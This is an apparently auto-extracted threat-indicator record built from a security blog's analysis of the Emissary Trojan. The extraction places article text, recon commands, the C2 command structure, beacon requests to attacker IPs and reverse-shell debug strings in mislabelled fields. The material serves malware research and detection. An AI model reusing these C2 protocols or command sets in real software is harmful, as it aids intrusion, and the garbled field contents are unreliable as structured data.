{"rule_id": 141, "name": "Emissary Trojan Changelog_ Did Operation Lotus Blossom Cause It to Evolve_ - Palo Alto Networks Blog", "description": "-", "references": [], "File_Names": ["emissary_compilation_timeline_with_olb_vertical1.png", "obesity.html", "blogs.com", "1.jpg"], "MD5_Hashes": [], "SHA1_Hashes": [], "SHA256_Hashes": [], "Registry_Entries": ["HKEY_CLASSES_ROOT\\Shell.LocalServer\\CheckCode\nHKEY_CLASSES_ROOT\\Shell.LocalServer\\CheckID\n\nEmissary uses the \u201cCheckCode\u201d registry key to store the encrypted con\ufb01guration for the Trojan, while it stores a GUID that\nEmissary uses to uniquely identify the compromised host in the \u201cCheckID\u201d key.\n\nThe malware performs initial system information gathering and saves data to a \ufb01le named TMP2548. The initial gathering\nrelies on a combination of the following commands executed by the command prompt:\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n\ncommands executed by the command prompt:\n\nECHO VER\nVER\nECHO IPCONFIG /ALL\nIPCONFIG /ALL\nECHO NET LOCALGROUP ADMINISTRATORS\nNET LOCALGROUP ADMINISTRATORS\nECHO NET START\nNET START\nECHO GPRESULT /Z\nGPRESULT /Z\nECHO GPRESULT\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0/SCOPE COMPUTER /Z\nGPRESULT\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0 /SCOPE COMPUTER /Z\nECHO SYSTEMINFO\nSYSTEMINFO\n\nEmissary parses command and control responses for \u201cinstru\u201d, which will precede a GUID value that designates the\ncommand the C2 server wishes to execute on the system. The command handler does not use a nested if/else or switch\nstatement like most malware families, instead Emissary creates a structure that contains all of the available command\nGUIDs that it will iterate through each time the C2 supplies a GUID in order to determine which command the operator\nwishes to execute. Emissary can include up to 32 di\ufb00erent commands within this data structure, but it appears the author\nhas decided to include six commands within the Trojan. The following denotes the command handler structure used by\nEmissary v1.0:\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n\nstruct EMISSARY_COMMAND\n{\n\u00a0\u00a0CHAR guid[40];\n\u00a0\u00a0DWORD sub_function;\n\u00a0\u00a0DWORD arg1_subfunction;\n\u00a0\u00a0DWORD arg2_subfunction;\n\u00a0\u00a0DWORD arg3_subfunction;\n};\n\nstruct commandHandler \n{\n\u00a0\u00a0DWORD number_of_commands;\n\u00a0\u00a0DWORD unused;\n\u00a0\u00a0struct EMISSARY_COMMAND cmd_0;\n\u00a0\u00a0struct EMISSARY_COMMAND cmd_1;\n\u00a0\u00a0struct EMISSARY_COMMAND cmd_2;\n\u00a0\u00a0struct EMISSARY_COMMAND cmd_3;\n\u00a0\u00a0struct EMISSARY_COMMAND cmd_4;\n\u00a0\u00a0struct EMISSARY_COMMAND cmd_5;\n};\n\nTable 1 contains the commands available within the Emissary v1.0 command handler.\n\nCommand\n\nDescription\n\nbac84b12-5b0b-491f-\na885-8667d156394f\n\nUpload \ufb01le.\n\nhttp://researchcenter.paloaltonetworks.com/2016/02/emissary-trojan-changelog-did-operation-lotus-blossom-cause-it-to-evolve/\n\n6/18\n\n\u00a0\n\u00a0\n\f2016/10/31\n\nEmissary Trojan Changelog: Did Operation Lotus Blossom Cause It to Evolve? - Palo Alto Networks Blog\n\n3d8313cc-53ca-4751-\nbbbf-ea5f914f8e65\n\nDownload \ufb01le.\n\ndb0e93e7-b46c-4cba-\n81f1-ec70da57dc19\n\nUpdate con\ufb01g. C2 speci\ufb01es \ufb01les as: p1\n= C2 server 1, p2 = C2 server 2, p3 =\nC2 server 3, p4 = Sleep Interval, p5 =\nSystem Identi\ufb01er (computer name), p6\n= GUID for beacon.\n\n2e382e51-3089-4293-\n8454-5eccb253eb54\n\nExecutes a speci\ufb01ed command.\n\na57db08a-bf97-4b43-\nb27d-157e62e2fd74\n\nCreate remote shell.\n\neab5c1ab-a497-4fc2-bbe0-\n049be45d6f2d\n\nUpdate Trojan with new executable.\n\nTable 1: Emissary command handler\n\nThe Emissary version 1.0 beacon to the C2 server appears as follows:\n\n1\n2\n3\n4\n\nGET /VSNET/default.aspx HTTP/1.1\nUser-Agent: Mozilla/4.0\nHost: 193.34.144[.]21\nCookie: guid=af44f802-ba5c-4b3c-8c6b-2ea411058678; op=1635b097-ffe4-4711-89e6-7f8c7f4cdca6\n\nDate: 5/31/2009\n\nSHA256: e6c4611b1399ada920730686395d6fc1700fc39add3d0d40b4f784ccb6ad0c30, Original Name: WUMsvc.dll\n\nRemoved checks for \u201c//\u201d and \u201c/\u201d in the update con\ufb01guration command when updating the three C2 servers.\n\nVersion 1.1\n\nDate: 6/5/2009\n\nSHA256: 931a1284b11a3997c7a99076d582ed3436aa30409dc73bd763436dddd490f9cb\n\nOriginal Name: WUMsvc.dll\n\nBug \ufb01xes:\n\nAdded code to make sure the content received from the C2 server matches the \u201cContent-Length\u201d value in the HTTP\nresponse.\nCode added to allow for the download of more than 524,288 bytes.\n\nThe Emissary v1.1 C2 beacon appears as follows, which has not changed since version 1.0:\n\n1\n2\n3\n4\n\nGET /eng/comfunc/comfunc/default.aspx HTTP/1.1\nUser-Agent: Mozilla/4.0\nHost: 137.189.145.1\nCookie: guid=af44f802-ba5c-4b3c-8c6b-2ea411058678; op=1635b097-ffe4-4711-89e6-7f8c7f4cdca6\n\nVersion 2.0\n\nDate: 9/15/2011\n\nSHA256: 5edf2d0270f8e7eb5be3476802e46c578c4afc4b046411be0806b9acc3bfa099 Original Name: EmissaryDll.dll\n\nVersion 2.0 was a signi\ufb01cant re-write of the Emissary Trojan.\n\nThe con\ufb01guration data for the Trojan is still saved to the registry, but the registry key has changed to:\n\n1 SOFTWARE\\Microsoft\\VBA\\VbaData\n\nThe con\ufb01guration structure also changed in size to 464 bytes. The Emissary con\ufb01guration is now encrypted using a custom\nalgorithm that uses the \u201csrand\u201d function to seed the \u201crand\u201d function using a value of 2563. This seed value causes the\n\u201crand\u201d function to generate the same values each time, which Emissary will use as a key along with the XOR operation. The\ncon\ufb01guration now contains the version number of Emissary, instead of the version being hardcoded into the Trojan.\n\nhttp://researchcenter.paloaltonetworks.com/2016/02/emissary-trojan-changelog-did-operation-lotus-blossom-cause-it-to-evolve/\n\n7/18\n\n\f2016/10/31\n\nEmissary Trojan Changelog: Did Operation Lotus Blossom Cause It to Evolve? - Palo Alto Networks Blog\n\nThis version of Emissary keeps track of which C2 location within its con\ufb01guration that it has been communicating with by\nstoring the index of the C2 server (1, 2, or 3) in the following registry key:\n\n1 SOFTWARE\\Microsoft\\VBA\\VbaList\n\nThis version of Emissary moves away from the command handler using the structure and moves to a nested if/else\nstatement for less complicated command handling; however, the command GUID and commands themselves are\nunchanged.\n\nThe Emissary version 2.0 beacon changed slightly from previous versions, speci\ufb01cally the removal of the User-Agent \ufb01eld\nand the use of a lowercase \u201ch\u201d in the \u201cHost\u201d \ufb01eld. The following is an example of the version 2.0 beacon, which contains the\nsame GUID and \u201cop\u201d values:\n\n1\n2\n3\n\nGET /0test/test/default.aspx HTTP/1.1\nhost: 163.20.127.27\nCookie: guid=af44f802-ba5c-4b3c-8c6b-2ea411058678; op=1635b097-ffe4-4711-89e6-7f8c7f4cdca6;\n\nVersion 2.0 also introduces a debug message logging system that includes verbose error messages that are accompanied\nby an error ID number. Error messages are written to the \ufb01le %TEMP%\u29f5em.log. The following is a list of all possible debug\nmessages:\n\nhttp://researchcenter.paloaltonetworks.com/2016/02/emissary-trojan-changelog-did-operation-lotus-blossom-cause-it-to-evolve/\n\n8/18\n\n\f2016/10/31\n\nEmissary Trojan Changelog: Did Operation Lotus Blossom Cause It to Evolve? - Palo Alto Networks Blog\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n35\n36\n37\n38\n39\n40\n41\n42\n43\n44\n45\n46\n47\n48\n49\n50\n51\n52\n53\n54\n55\n56\n57\n58\n59\n60\n61\n62\n63\n64\n\nSource - Error ID - Debug Message\nemissarydll.cpp - 0x30 - InitApp() - Event already exists\nemissarydll.cpp - 0x35 - InitApp() - Event create successful\nemissarydll.cpp - 0x3b - InitApp() - create work thread\nshell.cpp - 0x30 - SendShellOutputThread - PeekNamedPipe - Error : 0x%08x\nshell.cpp - 0x3e - SendShellOutputThread() : Timeout\nshell.cpp - 0x53 - SendShellOutputThread - ReadFile - Error : 0x%08x\nshell.cpp - 0x5b - SendShellOutputThread - send - Error : 0x%08x\nshell.cpp - 0x62 - SendShellOutputThread() : thread exit\nshell.cpp - 0x7f - RecvShellCmdThread - recv - Error : 0x%08x\nshell.cpp - 0x89 - RecvShellCmdThread - WriteFile - Error : 0x%08x\nshell.cpp - 0x8f - RecvShellCmdThread() : thread exit\nshell.cpp - 0xeb - Error occured : %s [%d]\nshell.cpp - 0xfa - TerminateThread Input Thread\nshell.cpp - 0x100 - TerminateThread Output Thread\nshell.cpp - 0x118 - SocketShell - Fail To Create Reverse Socket\nshell.cpp - 0x12f - SocketShell - Fail To\u00a0\u00a0Generate Reverse Shell\nshell.cpp - 0x13a - SocketShell - SocketShell - Fail To\u00a0\u00a0Generate Reverse Shell\nshell.cpp - 0x13e - SocketShell - Create Reverse Shell Thread OK\nconfig.cpp - 0x38 - RegCreateKeyEx error : %0x08x\nconfig.cpp - 0x46 - RegSetValueEx error : %0x08x\nconfig.cpp - 0x5e - ReadConfig - RegCreateKeyEx error : 0x%08x\nconfig.cpp - 0x66 - ReadConfig - RegQueryValueEx error : 0x%08x\nconfig.cpp - 0xab - find user: %s\nconfig.cpp - 0xbc - can not find proxy\nconfig.cpp - 0xc7 - get ProxySetting failed\nconfig.cpp - 0xd4 - find proxy server : %s\nrun.cpp -\u00a0\u00a0\u00a0\u00a0\u00a0\u00a00x75 - InitConfig: [g_ServerPath:%s] [g_ServerName:%s] [g_port:%d] [g_ServerUrl:%s]\nrun.cpp - 0x9d - InitConfig: [g_DelayTime:%d]\nrun.cpp - 0xbe - get proxy the last time used:%s\nrun.cpp - 0xc3 - server index:%d\nrun.cpp - 0xd9 - RetryTimes = %d\nrun.cpp - 0xec - connect %s error :%s\nrun.cpp - 0x10c - process a request ok.\nhttpclient.cpp - 0x98 - ASP.NET_SessionId\u957f\u5ea6\u5f02\u5e38:[%d][%s] (translation: ASP.NET_SessionId Length Exception:[%d][%s])\nhttpclient.cpp - 0xd0 - ******not connected !\nhttpclient.cpp - 0xf4 - read hread error : %s\nhttpclient.cpp - 0x102 - body length = 0\nhttpclient.cpp - 0x13d - decrypt error"], "URLs": ["http://researchcenter.paloaltonetworks.com/2015/12/attack-on-french-", "http://researchcenter.paloaltonetworks.com/wp-", "http://pwc.blogs.com/cyber_security_updates/2015/12/elise-security-through-obesity.html)", "http://researchcenter.paloaltonetworks.com/author/robert-falcone/)", "http://researchcenter.paloaltonetworks.com/2016/02/emissary-trojan-changelog-did-operation-lotus-blossom-cause-it-to-evolve/", "http://researchcenter.paloaltonetworks.com/2016/02/emissary-trojan-changelog-did-operation-lotus-blossom-cause-it-to-", "http://researchcenter.paloaltonetworks.com/threat-prevention-2/),", "http://researchcenter.paloaltonetworks.com/malware-", "http://researchcenter.paloaltonetworks.com/2015/06/operation-lotus-blossom/)", "http://researchcenter.paloaltonetworks.com/malware-2/),", "http://researchcenter.paloaltonetworks.com/wp-content/uploads/2016/02/Emissary-1.jpg)", "http://researchcenter.paloaltonetworks.com/author/jen-miller-osborn/)"], "weight": 0.0}